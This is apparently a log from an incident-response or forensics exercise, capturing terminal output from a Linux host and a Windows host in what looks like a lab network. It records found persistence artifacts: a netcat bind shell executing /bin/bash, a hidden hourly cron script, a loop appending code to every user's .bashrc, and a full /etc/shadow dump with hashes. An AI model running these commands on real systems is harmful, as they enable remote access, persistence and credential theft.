+tcp        0      0 0.0.0.0:13666           0.0.0.0:*               LISTEN      9970/netcat         
+
+askar4@DESKTOP-USER22:~$ date; date -u
+Tue Aug 23 15:34:24 UTC 2022
+Tue Aug 23 15:34:24 UTC 2022
+
+askar4@DESKTOP-USER22:~$ uname -a
+Linux DESKTOP-USER22 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
+
+*.=info;*.=notice;*.=warn;\
+	auth,authpriv.none;\
+	cron,daemon.none;\
+	mail,news.none		@remote-host:1514
+
+192.186.169.201 remote-host
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.   2 root root 4096 Apr 15 17:53 .
+drwxr-xr-x. 117 root root 4096 Aug 23 15:09 ..
+-rwxr-xr-x.   1 root root   32 Apr 15 17:51 .malice
+-rw-r--r--.   1 root root  102 May  3  2015 .placeholder
+
+askar4@DESKTOP-USER22:~$ cat /etc/cron.hourly/.malice
+#!/bin/bash
+
+/.malice/malice.sh
+
+askar4@DESKTOP-USER22:~$ sestatus
+SELinux status:                 enabled
+SELinuxfs mount:                /sys/fs/selinux
+SELinux root directory:         /etc/selinux
+Loaded policy name:             default
+Current mode:                   permissive
+Mode from config file:          permissive
+Policy MLS status:              enabled
+Policy deny_unknown status:     allowed
+Max kernel policy version:      30
+
+for file in $(ls -d /home/useraccounts/*/.bashrc); do sudo /bin/cat /.malice/.bashrc_malice >> "$file" ; done
+
+askar4@DESKTOP-USER22:~$ md5sum /.malice/malice.sh
+577892dae9c0b1578afa5bb90d70d84c  /.malice/malice.sh
+
+sudo /bin/netcat -knlvp 13666 -e /bin/bash &
+
+
+2022-08-23 16:05:02-- done vetting
+
+2022-08-23 16:05:05-- getting more info
+
+askar4@DESKTOP-USER22:~$ sudo cat /etc/shadow
+sudo: unable to resolve host DESKTOP-USER22
+root:$6$mbsdrOV0$Qcn9HAT6zOcneXfP3RI49flYEOKIsuM2qOb5fP15dX7r01tCCqv/a8pn56Bb08qn.7S2cqb5J8CoVSY/RQIp1.:19034:0:99999:7:::
+daemon:*:17575:0:99999:7:::
+bin:*:17575:0:99999:7:::
+sys:*:17575:0:99999:7:::
+sync:*:17575:0:99999:7:::
+games:*:17575:0:99999:7:::
+man:*:17575:0:99999:7:::
+lp:*:17575:0:99999:7:::
+mail:*:17575:0:99999:7:::
+news:*:17575:0:99999:7:::
+uucp:*:17575:0:99999:7:::
+proxy:*:17575:0:99999:7:::
+www-data:*:17575:0:99999:7:::
+backup:*:17575:0:99999:7:::
+list:*:17575:0:99999:7:::
+irc:*:17575:0:99999:7:::
+gnats:*:17575:0:99999:7:::
+nobody:*:17575:0:99999:7:::
+systemd-timesync:*:17575:0:99999:7:::
+systemd-network:*:17575:0:99999:7:::
+systemd-resolve:*:17575:0:99999:7:::
+systemd-bus-proxy:*:17575:0:99999:7:::
+unscd:*:17575:0:99999:7:::
+ntp:*:17575:0:99999:7:::
+_apt:*:17575:0:99999:7:::
+messagebus:*:17575:0:99999:7:::
+sshd:*:17575:0:99999:7:::
+debian:!*:17575:0:99999:7:::
+rtkit:*:17581:0:99999:7:::
+usbmux:*:17581:0:99999:7:::
+speech-dispatcher:!:17581:0:99999:7:::
+lightdm:*:17581:0:99999:7:::
+pulse:*:17581:0:99999:7:::
+avahi:*:17581:0:99999:7:::
+saned:*:17581:0:99999:7:::
+askar1:$1$p1I2i2.Z$edo37pcmJ5wYuq/K.Gdud/:19034:0:99999:7:::
+askar2:$1$sMDSckpB$La/MyVG/bb6kktcQWMweD0:19034:0:99999:7:::
+askar3:$1$GcQdimi3$mnMEwtZdWPV9ZlUNX4PPs.:19034:0:99999:7:::
+askar4:$1$moiZZTOq$Wobs33sp1q8kk.F5f1O9R0:19034:0:99999:7:::
+askar5:$1$oIA3ocVM$4.M4Gm8dkiwaFkeOoh9D7/:19034:0:99999:7:::
+askar6:$1$V8HOOmU.$No25uznETZbrGQLC9dOSB1:19034:0:99999:7:::
+askar7:$1$eN/TT4as$2WEOXzClQZcUxzYefOGIV1:19034:0:99999:7:::
+askar8:$1$axNDWzeS$veyoi.Uqo6CWZUbAuyQfi.:19034:0:99999:7:::
+askar9:$1$yGUogZpn$4HcnxsWMbwlsag.8FbmtA.:19034:0:99999:7:::
+askar10:$1$Y3k.GZr3$p4k.R.JubCoWKO0g5.xML.:19034:0:99999:7:::
+askar11:$1$vKHYMX1B$E3jEx0FpQtIGVfi1z/UU60:19034:0:99999:7:::
+askar12:$1$hCDN.i7c$1Lm7Cm2y4sazD/rdQfJml1:19034:0:99999:7:::
+askar13:$1$xoUzaQkS$U5sJ051FXnw6uqaCmRSq/1:19034:0:99999:7:::
+askar14:$1$30KieFZU$qzcj/zzhuEdH7x13sN4J./:19034:0:99999:7:::
+askar15:$1$lKjlS4oF$LgVx3LaLStQ4IU9sDhJfT0:19034:0:99999:7:::
+askar16:$1$0NJb1lv1$aDDQ8DP4kX3BICCGs8s9b/:19034:0:99999:7:::
+askar17:$1$1NaaYgZn$Fr0Xh/Ai33vDEhd2BcSXS1:19034:0:99999:7:::
+askar18:$1$28YCbMVW$lYiGxAungYzlgnSGiRwh2.:19034:0:99999:7:::
+askar19:$1$z5OXKkGp$Mf7Eh3MfC0t3pGnWOtsWq0:19034:0:99999:7:::
+askar20:$1$CiTQRXK/$33hu85GIKMyUp1SszIKLA0:19034:0:99999:7:::
+askar21:$1$4FwIarBD$YRsR2QBAbP0B9q1LSa6pq.:19034:0:99999:7:::
+askar22:$1$9Wy9hda9$cZIgj5aN6YR9xPqZtjbqi.:19034:0:99999:7:::
+askar23:$1$CzD7j.OZ$sAr6WS/pZzWnmuBzdnzed/:19034:0:99999:7:::
+radicle:$1$hgY.68kT$HsxzU.qHWSNECSzopzWIC/:19034:0:99999:7:::
+m.alice:$1$Wpc2G3jP$/5eSQMtgQ/WaXQK9wgbb7/:19097:0:99999:7:::
+askar4@DESKTOP-USER22:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+unscd:x:104:107::/var/lib/unscd:/bin/false
+ntp:x:105:109::/home/ntp:/bin/false
+_apt:x:106:65534::/nonexistent:/bin/false
+messagebus:x:107:110::/var/run/dbus:/bin/false
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+debian:x:1000:1000:Cloud-init-user,,,:/home/debian:/bin/bash
+rtkit:x:109:113:RealtimeKit,,,:/proc:/bin/false
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+lightdm:x:112:115:Light Display Manager:/var/lib/lightdm:/bin/false
+pulse:x:113:116:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+avahi:x:114:119:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+saned:x:115:120::/var/lib/saned:/bin/false
+askar1:x:1001:27::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:27::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:27::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:27::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:27::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:27::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:27::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:27::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:27::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:27::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:27::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:27::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:27::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:27::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:27::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:27::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:27::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:27::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:27::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:27::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:27::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:27::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:27::/home/useraccounts/askar23:/bin/bash
+radicle:x:1024:27::/home/useraccounts/radicle:/bin/bash
+
+askar4@DESKTOP-USER22:~$ sudo cat /etc/group
+sudo: unable to resolve host DESKTOP-USER22
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:
+floppy:x:25:
+tape:x:26:
+sudo:x:27:
+audio:x:29:pulse
+dip:x:30:
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:
+sasl:x:45:
+plugdev:x:46:
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-timesync:x:102:
+systemd-network:x:103:
+systemd-resolve:x:104:
+systemd-bus-proxy:x:105:
+input:x:106:
+unscd:x:107:
+crontab:x:108:
+ntp:x:109:
+messagebus:x:110:
+netdev:x:111:
+ssh:x:112:
+debian:x:1000:
+rtkit:x:113:
+lpadmin:x:114:
+lightdm:x:115:
+pulse:x:116:
+pulse-access:x:117:
+scanner:x:118:saned
+avahi:x:119:
+saned:x:120:
+
+askar4@DESKTOP-USER22:~$ ls -latr ..
+-bash: /usr/include/.../brconfig.sh: No such file or directory
+-bash: br_load_config: command not found
+total 104
+drwxr-xr-x.  4 root    root 4096 Feb 11  2022 ..
+drwxr-xr-x. 26 root    root 4096 Feb 11  2022 .
+drwxr-xr-x.  2 askar1  sudo 4096 Apr 15 14:28 askar1
+drwxr-xr-x.  2 askar11 sudo 4096 Apr 15 14:28 askar11
+drwxr-xr-x.  2 askar10 sudo 4096 Apr 15 14:28 askar10
+drwxr-xr-x.  2 askar15 sudo 4096 Apr 15 14:28 askar15
+drwxr-xr-x.  2 askar12 sudo 4096 Apr 15 14:28 askar12
+drwxr-xr-x.  2 askar2  sudo 4096 Apr 15 14:28 askar2
+drwxr-xr-x.  2 askar19 sudo 4096 Apr 15 14:28 askar19
+drwxr-xr-x.  2 askar18 sudo 4096 Apr 15 14:28 askar18
+drwxr-xr-x.  2 askar20 sudo 4096 Apr 15 14:28 askar20
+drwxr-xr-x.  2 askar6  sudo 4096 Apr 15 14:28 askar6
+drwxr-xr-x.  2 askar5  sudo 4096 Apr 15 14:28 askar5
+drwxr-xr-x.  2 askar4  sudo 4096 Apr 15 14:28 askar4
+drwxr-xr-x.  2 askar3  sudo 4096 Apr 15 14:28 askar3
+drwxr-xr-x.  2 radicle sudo 4096 Apr 15 14:28 radicle
+drwxr-xr-x.  2 askar9  sudo 4096 Apr 15 14:28 askar9
+drwxr-xr-x.  2 askar22 sudo 4096 Apr 15 14:47 askar22
+drwxr-xr-x.  8 askar21 sudo 4096 May 23 12:56 askar21
+drwxr-xr-x.  2 askar14 sudo 4096 May 23 17:10 askar14
+drwxr-xr-x.  2 askar8  sudo 4096 May 23 17:17 askar8
+drwxr-xr-x.  2 askar7  sudo 4096 May 23 17:38 askar7
+drwxr-xr-x.  2 askar13 sudo 4096 May 23 17:40 askar13
+drwxr-xr-x.  2 askar16 sudo 4096 May 23 17:47 askar16
+drwxr-xr-x.  2 askar17 sudo 4096 May 23 17:53 askar17
+drwxr-xr-x.  2 askar23 sudo 4096 Aug 23 13:32 askar23
+askar4@DESKTOP-USER22:~$ last
+askar17  pts/3        192.186.169.41   Tue Aug 23 16:10   still logged in
+askar9   pts/2        192.186.169.41   Tue Aug 23 15:42   still logged in
+askar4   pts/0        192.186.169.41   Tue Aug 23 15:26   still logged in
+askar23  pts/2        192.186.169.41   Tue Aug 23 13:42 - 13:48  (00:06)
+askar23  pts/2        192.186.169.41   Tue Aug 23 13:41 - 13:42  (00:00)
+askar23  pts/2        192.186.169.41   Tue Aug 23 13:38 - 13:41  (00:03)
+askar23  pts/2        192.186.169.41   Tue Aug 23 13:34 - 13:38  (00:03)
+askar23  pts/2        192.186.169.41   Tue Aug 23 13:30 - 13:34  (00:04)
+askar23  pts/1        192.186.169.41   Tue Aug 23 13:27 - 13:30  (00:02)
+askar23  pts/0        192.186.169.41   Tue Aug 23 12:01 - 14:53  (02:52)
+
+askar4@DESKTOP-USER22:~$ lastlog
+Username         Port     From             Latest
+root                                       **Never logged in**
+daemon                                     **Never logged in**
+bin                                        **Never logged in**
+sys                                        **Never logged in**
+sync                                       **Never logged in**
+games                                      **Never logged in**
+man                                        **Never logged in**
+lp                                         **Never logged in**
+mail                                       **Never logged in**
+news                                       **Never logged in**
+uucp                                       **Never logged in**
+proxy                                      **Never logged in**
+www-data                                   **Never logged in**
+backup                                     **Never logged in**
+list                                       **Never logged in**
+irc                                        **Never logged in**
+gnats                                      **Never logged in**
+nobody                                     **Never logged in**
+systemd-timesync                           **Never logged in**
+systemd-network                            **Never logged in**
+systemd-resolve                            **Never logged in**
+systemd-bus-proxy                           **Never logged in**
+unscd                                      **Never logged in**
+ntp                                        **Never logged in**
+_apt                                       **Never logged in**
+messagebus                                 **Never logged in**
+sshd                                       **Never logged in**
+debian                                     **Never logged in**
+rtkit                                      **Never logged in**
+usbmux                                     **Never logged in**
+speech-dispatcher                           **Never logged in**
+lightdm                                    **Never logged in**
+pulse                                      **Never logged in**
+avahi                                      **Never logged in**
+saned                                      **Never logged in**
+askar1           pts/7    192.186.169.41   Mon May 23 15:45:18 +0000 2022
+askar2           pts/0    192.186.169.41   Mon May 23 18:15:33 +0000 2022
+askar3           pts/6    192.186.169.41   Mon May 23 15:33:59 +0000 2022
+askar4           pts/0    192.186.169.41   Tue Aug 23 15:26:48 +0000 2022
+askar5           pts/6    192.186.169.41   Mon May 23 16:36:02 +0000 2022
+askar6           pts/3    192.186.169.41   Mon May 23 16:27:21 +0000 2022
+askar7           pts/2    192.186.169.41   Mon May 23 17:19:43 +0000 2022
+askar8           pts/2    192.186.169.41   Mon May 23 16:05:05 +0000 2022
+askar9           pts/2    192.186.169.41   Tue Aug 23 15:42:21 +0000 2022
+askar10          pts/9    192.186.169.41   Mon May 23 17:07:08 +0000 2022
+askar11          pts/0    192.186.169.41   Mon May 23 16:45:05 +0000 2022
+askar12          pts/10   192.186.169.41   Mon May 23 17:08:13 +0000 2022
+askar13          pts/11   192.186.169.41   Mon May 23 17:08:37 +0000 2022
+askar14          pts/5    192.186.169.41   Mon May 23 16:27:47 +0000 2022
+askar15          pts/8    192.186.169.41   Mon May 23 17:03:27 +0000 2022
+askar16          pts/4    192.186.169.41   Mon May 23 16:58:14 +0000 2022
+askar17          pts/3    192.186.169.41   Tue Aug 23 16:10:05 +0000 2022
+askar18          pts/3    192.186.169.41   Mon May 23 15:20:40 +0000 2022
+askar19          pts/4    192.186.169.41   Tue Aug 23 16:13:21 +0000 2022
+askar20          pts/2    192.186.169.41   Mon May 23 15:07:17 +0000 2022
+askar21                                    **Never logged in**
+askar22                                    **Never logged in**
+askar23          pts/2    192.186.169.41   Tue Aug 23 13:42:25 +0000 2022
+radicle                                    **Never logged in**
+m.alice                                    **Never logged in**
+
+
+2022-08-23 16:20:58-- OFF
+
+
+
+------------------------X
+=========================
+
+=========================
+T7: 192.186.169.203
+=========================
+X-----------------------
+
+
+2022-08-23 16:26:53-- ON
+
+
+2022-08-23 16:27:23-- start vetting
+
+askar4@DESKTOP-USER23 C:\Users\askar4>ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DESKTOP-USER23
+   Primary Dns Suffix  . . . . . . . :
+   Node Type . . . . . . . . . . . . : Hybrid        
+   IP Routing Enabled. . . . . . . . : No 
+   WINS Proxy Enabled. . . . . . . . : No 
+   DNS Suffix Search List. . . . . . : vta
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : vta
+   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter
+   Physical Address. . . . . . . . . : FA-16-3E-C8-33-62
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+   Link-local IPv6 Address . . . . . : fe80::75fa:5fe2:45fa:a94e%2(Preferred) 
+   IPv4 Address. . . . . . . . . . . : 192.186.169.203(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Lease Obtained. . . . . . . . . . : Saturday, June 11, 2022 2:17:53 AM   
+   Lease Expires . . . . . . . . . . : Wednesday, August 24, 2022 9:00:47 AM
+   Default Gateway . . . . . . . . . : 192.186.169.1
+   DHCP Server . . . . . . . . . . . : 192.186.169.4
+   DHCPv6 IAID . . . . . . . . . . . : 117052990
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-98-76-52-FA-16-3E-C8-33-62
+   DNS Servers . . . . . . . . . . . : 10.50.255.254
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+
+Ethernet adapter Ethernet 2:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Kaspersky Security Data Escort Adapter
+   Physical Address. . . . . . . . . : 00-FF-DC-C5-B4-CD
+   DHCP Enabled. . . . . . . . . . . : Yes
+   Autoconfiguration Enabled . . . . : Yes
+
+
+
+askar4@DESKTOP-USER23 C:\Users\askar4>date /t
+Tue 08/23/2022 
+
+askar4@DESKTOP-USER23 C:\Users\askar4>time /t
+04:28 PM
+
+kaspersky.exe                 4656 Services                   0     21,212 K Unknown         DESKTOP-USER23\cloudbase-init                           0:00:00 N/
+ksde.exe                      4476 Services                   0      8,016 K Unknown         NT AUTHORITY\SYSTEM                                     0:02:28 N/
+avp.exe                       2584 Services                   0     75,820 K Unknown         NT AUTHORITY\SYSTEM                                     3:44:04 N/
+
+CommandLine="C:\kaspersky.exe" /verysilent
+CommandLine="C:\Program Files (x86)\Kaspersky Lab\Kaspersky Secure Connection 4.0\ksde.exe" -r
+  TCP    192.186.169.203:53279  38.113.165.142:443     ESTABLISHED     2584
+  TCP    192.186.169.203:53277  38.113.165.142:443     ESTABLISHED     2584
+
+HKEY_LOCAL_MACHINE\software\KasperskyLab
+
+TaskName:                             \Kaspersky_Upgrade_Launcher_{278ADC42-419D-4547-A6CA-5B74BE0AD901}
+
+ Directory of c:\
+
+12/07/2019  09:14 AM    <DIR>          PerfLogs
+06/11/2022  02:17 AM    <DIR>          Users
+06/11/2022  02:18 AM    <DIR>          Program Files (x86)
+06/11/2022  02:20 AM         2,623,360 kaspersky.exe
+06/11/2022  02:37 AM    <DIR>          Windows
+06/11/2022  02:41 AM    <DIR>          Windows.old
+06/11/2022  10:05 AM    <DIR>          Program Files
+
+2022-08-23 16:57:58-- done vetting
+
+2022-08-23 16:58:02-- user info
+
+askar4@DESKTOP-USER23 C:\Users\askar4>net user
+
+User accounts for \\DESKTOP-USER23
+
+-------------------------------------------------------------------------------
+Admin                    Administrator            askar1
+askar10                  askar11                  askar12
+askar13                  askar14                  askar15
+askar16                  askar17                  askar18
+askar19                  askar2                   askar20
+askar21                  askar22                  askar23
+askar3                   askar4                   askar5
+askar6                   askar7                   askar8
+askar9                   cloudbase-init           DefaultAccount
+Guest                    sshd                     WDAGUtilityAccount
+The command completed successfully.
+
+
+askar4@DESKTOP-USER23 C:\Users\askar4>net localgroup
+
+Aliases for \\DESKTOP-USER23
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Administrators
+*Backup Operators
+*Cryptographic Operators
+*Device Owners
+*Distributed COM Users
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Power Users
+*Remote Desktop Users
+*Remote Management Users
+*Replicator
+*System Managed Accounts Group
+*Users
+The command completed successfully.
+
+askar4@DESKTOP-USER23 C:\Users\askar4>wmic useraccount where "LocalAccount='TRUE'" get Caption, Disabled, Domain, Lockout, PasswordExpires, SID, Status
+Caption                            Disabled  Domain          Lockout  PasswordExpires  SID                                             Status    
+DESKTOP-USER23\Admin               FALSE     DESKTOP-USER23  FALSE    FALSE            S-1-5-21-1519686172-1342361940-3510178374-1000  OK        
+DESKTOP-USER23\Administrator       FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-500   OK
+DESKTOP-USER23\askar1              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1004  OK
+DESKTOP-USER23\askar10             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1013  OK
+DESKTOP-USER23\askar11             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1014  OK
+DESKTOP-USER23\askar12             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1015  OK
+DESKTOP-USER23\askar13             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1016  OK
+DESKTOP-USER23\askar14             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1017  OK
+DESKTOP-USER23\askar15             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1018  OK
+DESKTOP-USER23\askar16             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1019  OK
+DESKTOP-USER23\askar17             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1020  OK
+DESKTOP-USER23\askar18             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1021  OK
+DESKTOP-USER23\askar19             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1022  OK
+DESKTOP-USER23\askar2              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1005  OK
+DESKTOP-USER23\askar20             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1023  OK
+DESKTOP-USER23\askar21             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1024  OK
+DESKTOP-USER23\askar22             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1025  OK
+DESKTOP-USER23\askar23             FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1026  OK
+DESKTOP-USER23\askar3              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1006  OK
+DESKTOP-USER23\askar4              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1007  OK
+DESKTOP-USER23\askar5              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1008  OK
+DESKTOP-USER23\askar6              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1009  OK
+DESKTOP-USER23\askar7              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1010  OK
+DESKTOP-USER23\askar8              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1011  OK
+DESKTOP-USER23\askar9              FALSE     DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-1012  OK
+DESKTOP-USER23\cloudbase-init      FALSE     DESKTOP-USER23  FALSE    FALSE            S-1-5-21-1519686172-1342361940-3510178374-1002  OK
+DESKTOP-USER23\DefaultAccount      TRUE      DESKTOP-USER23  FALSE    FALSE            S-1-5-21-1519686172-1342361940-3510178374-503   Degraded
+DESKTOP-USER23\Guest               TRUE      DESKTOP-USER23  FALSE    FALSE            S-1-5-21-1519686172-1342361940-3510178374-501   Degraded
+DESKTOP-USER23\sshd                FALSE     DESKTOP-USER23  FALSE    FALSE            S-1-5-21-1519686172-1342361940-3510178374-1003  OK
+DESKTOP-USER23\WDAGUtilityAccount  TRUE      DESKTOP-USER23  FALSE    TRUE             S-1-5-21-1519686172-1342361940-3510178374-504   Degraded
+
+
+AccountExpires         :
+Description            : Admin user
+Enabled                : True
+FullName               : Admin
+PasswordChangeableDate : 6/11/2022 2:18:56 AM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : False
+PasswordLastSet        : 6/11/2022 2:18:56 AM
+LastLogon              : 2/11/2022 7:56:58 PM
+Name                   : Admin
+SID                    : S-1-5-21-1519686172-1342361940-3510178374-1000
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            : Built-in account for administering the computer/domain
+Enabled                : True
+FullName               :
+PasswordChangeableDate : 6/11/2022 2:18:54 AM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 6/11/2022 2:18:54 AM
+LastLogon              : 5/20/2022 2:51:15 PM
+Name                   : Administrator
+SID                    : S-1-5-21-1519686172-1342361940-3510178374-500
+PrincipalSource        : Local
+ObjectClass            : User
+
+AccountExpires         :
+Description            :
+Enabled                : True
+FullName               :
+PasswordChangeableDate : 2/11/2022 7:58:13 PM
+PasswordExpires        :
+UserMayChangePassword  : True
+PasswordRequired       : True
+PasswordLastSet        : 2/11/2022 7:58:13 PM
+LastLogon              : 8/23/2022 4:25:07 PM
+Name                   : askar4
+SID                    : S-1-5-21-1519686172-1342361940-3510178374-1007
+PrincipalSource        : Local
+ObjectClass            : User
+
+2022-08-23 17:13:01-- OFF
+
+------------------------X
+=========================
+
+
